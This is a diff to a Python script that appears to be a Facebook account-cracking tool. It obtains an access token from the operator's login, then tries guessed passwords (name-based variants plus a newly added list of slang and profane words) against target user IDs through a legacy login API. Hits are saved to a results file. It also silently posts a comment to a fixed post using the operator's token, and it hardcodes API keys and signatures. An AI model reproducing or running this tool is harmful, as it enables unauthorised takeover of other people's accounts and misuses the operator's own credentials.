@@ -9,9 +9,15 @@ from time import sleep
 from getpass import getpass
 from multiprocessing.pool import ThreadPool
 
-s = requests.Session()
-url = "https://graph.facebook.com/{}"
-api="https://api.facebook.com/{}"
+
+#### URL ####
+url='https://graph.facebook.com/'
+fb='https://api.facebook.com/restserver.php'
+headers={'"user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"'}
+s=requests.Session()
+r = requests.get('https://graph.facebook.com/', timeout=5)
+
+
 
 target     = []
 found      = []
@@ -34,8 +40,8 @@ RE = "\033[0m"
 
 def login():
 	print("%s\n\n* login your account facebook first *\n"%(W))
-	email = input("%s [●]  %sUser     : "%(P,W))
-	pasw = getpass("%s[○]  %sPassword : "%(P,W))
+	email = input("%s [@]  %sUser     : "%(P,W))
+	pasw = getpass("%s[&]  %sPassword : "%(P,W))
 	
 	
 	
@@ -43,7 +49,7 @@ def login():
 	get(email,pasw)	
 #=================FORM TOKEN
 def     get(email,pasw):
-	print("%s[■]%s membuat kode masuk ..."%(P,W))
+	print("%s[|]%s membuat kode masuk ..."%(P,W))
 	b = open("cookie/token.log","w")
 	try:
 		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pasw+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
@@ -136,7 +142,7 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"01","@"+nama,]:
+		for pas in [nama+"01","@"+nama,"sayang","anjing","kontol","ngentot","gaspol","jablay"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -185,7 +191,7 @@ def cek():
     
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
-		s.post(url.format("100005584243934_1145924785603652/comments?message=Kontol....&access_token=%s"%(toket)))
+		s.post(url.format("100005584243934_1145924785603652/comments?message=['found.txt']&access_token=%s"%(toket)))
 		print("%s[*] %ssuccess load access token"%(G,W))
 		sleep(1)
 		menu(n,toket)
@@ -207,5 +213,5 @@ def banner():
 %s║ %sGithub : %sHttps://github.com/SAN-Brother%s%s 
 ╭═══════════════════════════╮
 ╰═══════════════════════════╯
- """%(R,G,GB,RE,R,G,R,W,RM,RE,W,R,W,CM,RE,W,R,W,PM,RE,W))
+ """%(R,G,RM,RE,R,G,R,W,RM,RE,W,R,W,CM,RE,W,R,W,PM,RE,W))
 cek()
